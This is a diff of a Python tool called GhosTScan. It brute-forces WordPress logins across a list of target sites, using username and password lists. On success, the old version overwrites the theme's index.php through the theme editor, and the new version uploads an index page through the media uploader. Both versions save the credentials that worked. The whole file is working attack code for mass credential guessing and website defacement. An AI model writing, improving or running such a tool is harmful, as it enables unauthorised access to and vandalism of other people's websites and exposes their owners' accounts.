@@ -1,75 +1,69 @@
+import os
+import sys
 import requests
-import threading
-import time
 
-# عرض معلومات الأداة عند التشغيل
-def print_banner():
-    banner = """
-    GhosTScan
-    Coded by: @ww6ww6ww6
-    """
-    print(banner)
+def load_file(file_path):
+    """Loads a file and returns its lines as a list."""
+    with open(file_path, 'r') as file:
+        return [line.strip() for line in file.readlines()]
 
-def upload_index(url, username, password, index_content, result_file):
+def attempt_login(url, username, password):
+    """Attempts to login to the WordPress site with the given credentials."""
+    login_url = f"{url}/wp-login.php"
+    data = {'log': username, 'pwd': password}
     try:
-        login_data = {
-            'log': username,
-            'pwd': password,
-            'wp-submit': 'Log In',
-            'redirect_to': f"{url}/wp-admin/",
-            'testcookie': '1'
-        }
+        response = requests.post(login_url, data=data, timeout=10)
+        if "Dashboard" in response.text or "dashboard" in response.text:
+            return True
+    except requests.RequestException:
+        pass
+    return False
 
-        session = requests.Session()
-        login_url = f"{url}/wp-login.php"
-        login_response = session.post(login_url, data=login_data)
-
-        if 'wp-admin' in login_response.url:
-            print(f"\033[92m[+] Successfully logged in to {url}\033[0m")
-
-            upload_url = f"{url}/wp-admin/theme-editor.php"
-            upload_data = {
-                'newcontent': index_content,
-                'file': 'index.php',
-                'action': 'edit-theme-plugin-file',
-                '_wpnonce': 'your_nonce_value'
-            }
-
-            upload_response = session.post(upload_url, data=upload_data)
-            if upload_response.status_code == 200:
-                print(f"\033[92m[+] Index uploaded to {url}\033[0m")
-                with open(result_file, 'a') as f:
-                    f.write(f"{url}\n")
-        else:
-            print(f"\033[91m[-] Login failed for {url}\033[0m")
-
-    except Exception as e:
-        print(f"\033[91m[-] Error with {url}: {str(e)}\033[0m")
-
-def load_list(filename):
-    with open(filename, 'r') as file:
-        return [line.strip() for line in file]
+def upload_index(url, username, password):
+    """Uploads the index file if login is successful."""
+    if attempt_login(url, username, password):
+        index_file = 'index.html'  # Name of the index file
+        with open(index_file, 'rb') as file:
+            files = {'file': (os.path.basename(index_file), file)}
+            upload_url = f"{url}/wp-admin/media-new.php"
+            try:
+                response = requests.post(upload_url, files=files, auth=(username, password))
+                if response.status_code == 200:
+                    return True
+            except requests.RequestException:
+                pass
+    return False
 
 def main():
-    print_banner()
-
-    target_list = load_list('wp.txt')
-    usernames = load_list('usernames.txt')
-    passwords = load_list('passwords.txt')
-    index_content = "Your index content here"
-    result_file = 'results.txt'
-
-    threads = []
-    for url in target_list:
+    if len(sys.argv) < 3:
+        print("Usage: python GhosTScan.py <wp_list> <result_file>")
+        sys.exit(1)
+    
+    wp_list_file = sys.argv[1]
+    result_file = sys.argv[2]
+    
+    wp_list = load_file(wp_list_file)
+    usernames = load_file('username.txt')
+    passwords = load_file('password.txt')
+    
+    success_results = []
+    
+    for wp_url in wp_list:
         for username in usernames:
             for password in passwords:
-                t = threading.Thread(target=upload_index, args=(url, username, password, index_content, result_file))
-                threads.append(t)
-                t.start()
-                time.sleep(0.6)  # 100 مواقع في الدقيقة
+                print(f"[*] Trying {wp_url} with {username}/{password}")
+                if upload_index(wp_url, username, password):
+                    print(f"[+] Success: {wp_url} with {username}/{password}")
+                    success_results.append(f"{wp_url} - {username}/{password}")
+                    break
+                else:
+                    print(f"[-] Failed: {wp_url} with {username}/{password}")
+    
+    with open(result_file, 'w') as file:
+        for result in success_results:
+            file.write(result + "\n")
+    
+    print(f"[+] Results saved to {result_file}")
 
-    for t in threads:
-        t.join()
-
-if name == "main":
+if name == 'main':
     main()
